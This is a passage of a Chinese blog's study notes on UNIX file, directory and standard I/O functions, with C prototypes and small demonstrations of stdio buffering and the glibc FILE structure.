class="hljs-type">char</span> *oldname,<span class="hljs-type">int</span> newfd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *newname)</span>;<br></code></pre></td></tr></table></figure><h2 id="symlink-和-symlinkat"><a href="#symlink-和-symlinkat" class="headerlink" title="symlink 和 symlinkat"></a>symlink 和 symlinkat</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">symlink</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *actualpath, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *sympath)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">symlinkat</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *actualpath,<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *sympath)</span>;<br></code></pre></td></tr></table></figure><h2 id="readlink和readlinkat"><a href="#readlink和readlinkat" class="headerlink" title="readlink和readlinkat"></a>readlink和readlinkat</h2><p>用于打开与读取符号链接本身</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">readlink</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-keyword">restrict</span> pathname, <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">size_t</span> bufsize)</span>;<br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">readlinkat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> pathname, <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">size_t</span> bufsize)</span>;<br></code></pre></td></tr></table></figure><h2 id="文件时间"><a href="#文件时间" class="headerlink" title="文件时间"></a>文件时间</h2><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221125105002804.png" alt="image-20221125105002804"></p><h2 id="futimens-utimensat和utimes"><a href="#futimens-utimensat和utimes" class="headerlink" title="futimens,utimensat和utimes"></a>futimens,utimensat和utimes</h2><p>用于修改文件的访问时间与修改时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">futimnes</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec times[<span class="hljs-number">2</span>])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">utimensat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec times[<span class="hljs-number">2</span>],<span class="hljs-type">int</span> flag)</span>;<br></code></pre></td></tr></table></figure><p>以秒或微妙修改文件时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">utimes</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timeval times[<span class="hljs-number">2</span>])</span>;<br></code></pre></td></tr></table></figure><h2 id="mkdir-mkdirat和rmdir"><a href="#mkdir-mkdirat和rmdir" class="headerlink" title="mkdir,mkdirat和rmdir"></a>mkdir,mkdirat和rmdir</h2><p><code>mkdir</code>与<code>mkdriat</code>函数创建目录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mkdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">mode_t</span> mode)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">mkdirt</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">mode_t</span> mode)</span>;<br></code></pre></td></tr></table></figure><p><code>rmdir</code>函数删除目录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">rmdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname)</span>;<br></code></pre></td></tr></table></figure><h2 id="目录读写操作"><a href="#目录读写操作" class="headerlink" title="目录读写操作"></a>目录读写操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br>DIR *<span class="hljs-title function_">opendir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathhname)</span>;<span class="hljs-comment">//打开指定目录</span><br>DIR *<span class="hljs-title function_">fdopendir</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<span class="hljs-comment">//将文件描述符转化为目录结构体</span><br><span class="hljs-comment">//两个函数返回值：若成功，返回指针；若出错，返回NULL</span><br><span class="hljs-keyword">struct</span> dirent *<span class="hljs-title function_">readdir</span><span class="hljs-params">(DIR *dp)</span>;<br><span class="hljs-comment">//返回值：若成功，返回指针；若在目录尾或出错，返回NULL</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">rewinddir</span><span class="hljs-params">(DIR *dp)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">closedir</span><span class="hljs-params">(DIR *dp)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">telldir</span><span class="hljs-params">(DIR *dp)</span>;<br><span class="hljs-comment">//返回值：与dp关联的目录中的当前位置</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seekdir</span><span class="hljs-params">(DIR *dp, <span class="hljs-type">long</span> loc)</span>;<br></code></pre></td></tr></table></figure><p><strong>dirent</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ino_t</span> d_ino;                      <span class="hljs-comment">//i-node数字</span><br><span class="hljs-type">char</span> d_name[];                    <span class="hljs-comment">//文件名</span><br></code></pre></td></tr></table></figure><h2 id="chdir和fchdir"><a href="#chdir和fchdir" class="headerlink" title="chdir和fchdir"></a>chdir和fchdir</h2><p>更改当前的工作目录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">chdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fchidr</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br></code></pre></td></tr></table></figure><h2 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h2><p>获取当前目录的路径</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">getcwd</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><h1 id="标准I-x2F-O库"><a href="#标准I-x2F-O库" class="headerlink" title="标准I&#x2F;O库"></a>标准I&#x2F;O库</h1><h2 id="fwide"><a href="#fwide" class="headerlink" title="fwide"></a>fwide</h2><p>用于设置流的定向，流的定向绝对了流是读或写，是单字节或多字节，若流的定向已经被决定则不能修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wchar.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fwide</span><span class="hljs-params">(FILE *fp, <span class="hljs-type">int</span> mode)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">返回值</span><br><span class="hljs-comment">正数为宽字节</span><br><span class="hljs-comment">负数为单字节</span><br><span class="hljs-comment">0为未定向</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="Buffering"><a href="#Buffering" class="headerlink" title="Buffering"></a>Buffering</h2><p>有三种缓冲类型</p><ul><li><code>Fully buffered</code>：全缓冲，直到缓冲区满才执行<code>I/O</code>操作，可以通过<code>flush</code>函数刷新缓冲区，执行<code>I/O</code>操作</li><li><code>Line buffered</code>：直到遇到回车符才会执行<code>I/O</code>操作</li><li><code>Unbuffered</code>：不缓存，直接输出</li></ul><p><code>ISO C</code>对缓冲类型的要求</p><ul><li>标准输入与标准输出是完全缓存的，除非它们与相关设备交互</li><li>标准错误流是不缓存的</li></ul><h3 id="缓冲知识点扩展"><a href="#缓冲知识点扩展" class="headerlink" title="缓冲知识点扩展"></a>缓冲知识点扩展</h3><p>参考链接<a href="https://blog.csdn.net/u014069939/article/details/84202445">不带缓存I&#x2F;O和标准I&#x2F;O(带缓存)之间的区别</a></p><p><strong>printf.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This Line Should be Cached...&quot;</span>);<br>sleep(<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nThis Line Should be Cached Again&quot;</span>);<br>sleep(<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This Line Should Not be Cached Agin\n&quot;</span>);<br>sleep(<span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>标准输出流默认为行缓冲输出，因此只有遇到回车符时才会将缓冲区的字符打印，因此第一条输出语句不带回车符时屏幕上不会有任何信息，而是等待回车符出现后才输出到屏幕上。</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230210005801166.png" alt="image-20230210005801166"></p><p>普通情况下，使用<code>printf</code>函数，不带回车符，程序也会将字符串打印在屏幕上，这是因为<code>main</code>函数会经过<code>exit</code>函数退出，<code>exit</code>函数会刷新缓冲区，使得字符串打印在屏幕上，但是通过<code>_Exit</code>函数则不会打印，则不会刷新。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This Line Should be Cached...&quot;</span>);<br>_Exit(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230210010057022.png" alt="image-20230210010057022"></p><p>当标准输出被重定向其余文件时，会从行缓冲转化为全缓存，那么只有缓冲区满或者通过<code>fflush</code>或<code>fclose</code>函数函数刷新缓冲区时才会在屏幕上打印字符串。</p><p><strong>FILE文件结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br><span class="hljs-type">int</span> _flags;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br><br><br><span class="hljs-type">char</span>* _IO_read_ptr; <span class="hljs-comment">//当前读的偏移</span><br><span class="hljs-type">char</span>* _IO_read_end; <span class="hljs-comment">//读缓冲区的末尾</span><br><span class="hljs-type">char</span>* _IO_read_base; <span class="hljs-comment">//读缓冲区的起始</span><br><span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">//写缓冲区的起始</span><br><span class="hljs-type">char</span>* _IO_write_ptr; <span class="hljs-comment">//当前写的偏移</span><br><span class="hljs-type">char</span>* _IO_write_end; <span class="hljs-comment">//写缓冲区的末尾</span><br><span class="hljs-type">char</span>* _IO_buf_base; <span class="hljs-comment">//缓冲区的起始</span><br><span class="hljs-type">char</span>* _IO_buf_end; <span class="hljs-comment">//缓冲区的末尾</span><br><br><span class="hljs-type">char</span> *_IO_save_base;<br><span class="hljs-type">char</span> *_IO_backup_base;<br><span class="hljs-type">char</span> *_IO_save_end;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br><span class="hljs-type">int</span> _fileno; <span class="hljs-comment">//FILE对应的文件描述符</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>FILE结构测试代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">5</span>];<br><span class="hljs-type">char</span> output[<span class="hljs-number">5</span>] = <span class="hljs-string">&quot;abcd&quot;</span>;<br>FILE *myfile = fopen(<span class="hljs-string">&quot;./test.txt&quot;</span>,<span class="hljs-string">&quot;r+&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;before reading\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read buffer base %p\n&quot;</span>, myfile-&gt;_IO_read_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read buffer length %d\n&quot;</span>, myfile-&gt;_IO_read_end - myfile-&gt;_IO_read_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write buffer base %p\n&quot;</span>, myfile-&gt;_IO_write_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write buffer length %d\n&quot;</span>, myfile-&gt;_IO_write_end - myfile-&gt;_IO_write_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf buffer base %p\n&quot;</span>, myfile-&gt;_IO_buf_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf length %d\n&quot;</span>, myfile-&gt;_IO_buf_end - myfile-&gt;_IO_buf_base);<br>fgets(buf, <span class="hljs-number">5</span>, myfile);<br><span class="hljs-comment">//fputs(output, myfile);</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;after reading\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;before reading\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read buffer base %p\n&quot;</span>, myfile-&gt;_IO_read_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read buffer length %d\n&quot;</span>, myfile-&gt;_IO_read_end - myfile-&gt;_IO_read_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write buffer base %p\n&quot;</span>, myfile-&gt;_IO_write_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write buffer length %d\n&quot;</span>, myfile-&gt;_IO_write_end - myfile-&gt;_IO_write_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf buffer base %p\n&quot;</span>, myfile-&gt;_IO_buf_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf length %d\n&quot;</span>, myfile-&gt;_IO_buf_end - myfile-&gt;_IO_buf_base);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230210020351980.png" alt="image-20230210020351980"></p><p>在读之前结构体还未初始化，只开辟了一段空间对<code>FILE</code>结构体进行存储</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230210020411853.png" alt="image-20230210020411853"></p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230210020520822.png" alt="image-20230210020520822"></p><p>可以看到即使代码中写的是读取<code>5</code>字节，但是缓冲区中还是存在着<code>42</code>字节的数据，因此带缓存的<code>I/O</code>是一次性读取<code>1024</code>个字节大小的数据（<code>_IO_buf</code>的大小）到读缓存区中，接着从缓存区中取出<code>5</code>个字节到指定的变量中。</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230210021036552.png" alt="image-20230210021036552"></p><h3 id="全缓冲"><a href="#全缓冲" class="headerlink" title="全缓冲"></a>全缓冲</h3><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230210135358969.png" alt="image-20230210135358969"></p><h2 id="setbuf和setvbuf"><a href="#setbuf和setvbuf" class="headerlink" title="setbuf和setvbuf"></a>setbuf和setvbuf</h2><p>用于设置是否缓存以及缓存的方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setbuf</span><span class="hljs-params">(FILE *<span class="hljs-keyword">restrict</span> fp, <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf)</span>; <span class="hljs-comment">//用于打开与关闭缓冲</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setvbuf</span><span class="hljs-params">(FILE *<span class="hljs-keyword">restrict</span> fp, <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">int</span> mode, <span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><p><code>setvbuf</code>函数可以指定缓存的方式，若<code>mode</code>选择<code>_IONBF</code>则采用无缓存模式</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221128145121567.png" alt="image-20221128145121567"></p><h2 id="打开流"><a href="#打开流" class="headerlink" title="打开流"></a>打开流</h2><h2 id="fopen、freopen和fdopen"><a href="#fopen、freopen和fdopen" class="headerlink" title="fopen、freopen和fdopen"></a>fopen、freopen和fdopen</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-keyword">restrict</span> pathname, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> type)</span>;<br>FILE *<span class="hljs-title function_">freopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> pathname, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> type, FILE *<span class="hljs-keyword">restrict</span> fp)</span>;<br>FILE *<span class="hljs-title function_">fdopen</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *type)</span>;<br><span class="hljs-comment">//成功返回文件指针，错误返回NULL</span><br></code></pre></td></tr></table></figure><ul><li><code>fopen</code>函数用打开指定路径的文件，与<code>open</code>函数的区别为<code>open</code>函数为系统调用而<code>fopen</code>函数为更高层的函数</li><li><code>freopen</code>函数为将文件描述符与指定路径的文件联系起来</li><li><code>fdopen</code>函数用于打开管道或者<code>socket</code>文件，因为常规的I&#x2F;O无法打开，则可以借助<code>fdopen</code>函数将上述文件描述符与标准I&#x2F;O联系起来</li></ul><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221128152516263.png" alt="image-20221128152516263"></p><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>关闭流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span><span class="hljs-params">(FILE *fp)</span><br></code></pre></td></tr></table></figure><h2 id="对流进行读写"><a href="#对流进行读写" class="headerlink" title="对流进行读写"></a>对流进行读写</h2><ul><li>每次输入&#x2F;输出</li><li>每次读取一行</li><li>直接I&#x2F;O</li></ul><h2 id="一次一字符输入函数"><a href="#一次一字符输入函数" class="headerlink" title="一次一字符输入函数"></a>一次一字符输入函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getc</span><span class="hljs-params">(FILE *fp)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fgetc</span><span class="hljs-params">(FILE *fp)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getchar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//getc(stdin);</span><br></code></pre></td></tr></table></figure><h2 id="ferror和feof"><a href="#ferror和feof" class="headerlink" title="ferror和feof"></a>ferror和feof</h2><p>用于判断读失败是由于到达文件末尾，还是读文件出错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">ferror</span><span class="hljs-params">(FILE *fp)</span>; <span class="hljs-comment">//读文件错误</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">feof</span><span class="hljs-params">(FILE *fp)</span>; <span class="hljs-comment">//遇到文件末尾</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clearerr</span><span class="hljs-params">(FILE *fp)</span>; <span class="hljs-comment">//清除错误位</span><br></code></pre></td></tr></table></figure><h2 id="ungetc"><a href="#ungetc" class="headerlink" title="ungetc"></a>ungetc</h2><p>用于将字符压回流中，但是只能压入一个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">ungetc</span><span class="hljs-params">(<span class="hljs-type">int</span> c, FILE *fp)</span>;<br></code></pre></td></tr></table></figure><h2 id="一次一字符输出函数"><a href="#一次一字符输出函数" class="headerlink" title="一次一字符输出函数"></a>一次一字符输出函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">puc</span><span class="hljs-params">(<span class="hljs-type">int</span> c, FILE *fp)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fputc</span><span class="hljs-params">(<span class="hljs-type">int</span> c,FILE *fp)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">putchar</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span>;<br></code></pre></td></tr></table></figure><h2 id="一次一行输入函数"><a href="#一次一行输入函数" class="headerlink" title="一次一行输入函数"></a>一次一行输入函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">fgets</span><span class="hljs-params">(<span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">int</span> n, FILE *<span 